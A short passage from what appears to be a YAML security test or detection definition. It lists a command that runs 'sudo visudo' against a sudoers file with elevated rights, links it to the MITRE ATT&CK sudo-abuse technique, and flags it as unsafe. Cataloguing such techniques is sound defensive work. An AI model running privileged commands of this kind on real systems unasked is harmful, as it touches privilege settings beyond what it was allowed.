        sudo visudo -c -f /usr/local/etc/sudoers
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1548/003
  is_safe: false
